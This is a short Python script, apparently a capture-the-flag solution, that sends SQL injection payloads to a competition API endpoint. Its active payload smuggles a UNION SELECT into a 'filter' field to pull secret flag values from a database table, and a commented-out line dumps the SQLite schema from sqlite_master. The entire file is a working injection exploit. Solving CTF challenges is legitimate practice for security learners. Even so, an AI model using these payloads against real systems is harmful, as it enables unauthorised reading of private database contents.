import requests

url = "http://kashictf.iitbhucybersec.in:63967/api/list-v2"

payload = {
    # "filter": "s' union select 1,1,1,1,1,group_concat(sql) from sqlite_master;#"
    "filter": "s' union select request_id,group_concat(secret_flag),1,1,1,1 from flags;#"
}

response = requests.post(url, json=payload)

data = response.text
print(data.replace("\\n", "\n"))
